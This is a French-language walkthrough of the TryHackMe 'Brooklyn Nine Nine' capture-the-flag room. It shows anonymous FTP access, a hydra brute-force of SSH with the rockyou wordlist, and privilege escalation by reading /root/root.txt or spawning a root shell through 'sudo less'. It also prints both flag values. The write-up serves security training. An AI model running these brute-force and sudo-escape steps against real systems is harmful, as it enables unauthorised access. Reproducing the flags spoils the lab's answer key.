# TryHackMe: Brooklyn Nine Nine

**Objectif :** recuperer le `user.txt` puis le `root.txt` sur une machine Linux simple. La room propose plusieurs chemins, mais je documente ici la voie la plus directe a partir du FTP anonyme, puis la privilege escalation via `less`.

---

## Introduction

**Brooklyn Nine Nine** est une room "easy" au format CTF classique :

- un flag utilisateur
- un flag root

Le bon reflexe est d'explorer toutes les surfaces legeres avant de chercher un exploit. Ici, un simple acces anonyme au FTP suffit a obtenir l'indice qui va tout debloquer.

---

## Question 1: User flag

### 1. Scan initial

Je commence par un scan standard :

```bash
nmap -sC -sV <IP>
```

Services trouves :

- `21/tcp` - FTP
- `22/tcp` - SSH
- `80/tcp` - HTTP

Le web ne donne rien de decisif au premier regard. Le FTP, en revanche, autorise un login anonyme.

### 2. Enumeration FTP

Connexion :

```bash
ftp <IP>
```

Avec :

- Username : `anonymous`
- Password : `anonymous`

Dans le FTP, je trouve :

```text
note_to_jake.txt
```

Je telecharge le fichier :

```bash
get note_to_jake.txt
```

Puis je le lis :

```bash
cat note_to_jake.txt
```

Le message indique clairement que **Jake a un mot de passe faible**.

### 3. Bruteforce SSH

Vu le contenu de la note, je cible directement `jake` sur SSH :

```bash
hydra -l jake -P /usr/share/wordlists/rockyou.txt ssh://<IP>
```

Le mot de passe est trouve, puis j'ouvre une session :

```bash
ssh jake@<IP>
```

### 4. Recherche du user flag

Le home de `jake` ne contient pas le flag, donc je liste les utilisateurs :

```bash
cd /home
ls -la
```

Je trouve notamment `holt`.

Dans son repertoire :

```bash
cat /home/holt/user.txt
```

Valeur :

```text
ee11cbb19052e40b07aac0ca060c23ee
```

### Reponse

**User flag:** `ee11cbb19052e40b07aac0ca060c23ee`

---

## Question 2: Root flag

### 1. Enumeration sudo

Je reste sur mon acces `jake` et je verifie ses privileges :

```bash
sudo -l
```

Sortie utile :

```text
(ALL) NOPASSWD: /usr/bin/less
```

`less` est exploitable via GTFOBins. On peut l'utiliser pour lire un fichier root ou pour s'echapper vers un shell.

### 2. Lecture directe du flag root

La methode la plus simple ici est juste de lire le flag directement :

```bash
sudo /usr/bin/less /root/root.txt
```

Le contenu affiche :

```text
63a9f0ea7bb98050796b649e85481845
```

Si on veut un shell root plutot qu'une simple lecture, on peut aussi faire :

```bash
sudo less /etc/profile
!/bin/sh
```

Mais pour la room, la lecture directe du flag suffit.

### Reponse

**Root flag:** `63a9f0ea7bb98050796b649e85481845`

---

## Variante alternative

La room a aussi une seconde voie populaire :

- recuperer une image depuis le site
- casser une passphrase stego
- obtenir les credentials de `holt`
- utiliser `sudo nano` depuis `holt`

Cette variante fonctionne aussi, mais le chemin FTP -> Jake -> `sudo less` est plus court et plus propre pour une premiere resolution.

---

## Recapitulatif des reponses

| Question | Reponse |
|----------|---------|
| User flag | `ee11cbb19052e40b07aac0ca060c23ee` |
| Root flag | `63a9f0ea7bb98050796b649e85481845` |

---

## Points cles a retenir

- Toujours tester un **FTP anonyme**.
- Un simple fichier de note peut suffire a justifier un bruteforce raisonnable.
- `sudo -l` reste une etape obligatoire apres tout shell.
- `less` est un excellent exemple de binaire anodin en apparence mais dangereux via GTFOBins.

---

**Auteur :** Saad Idrissi
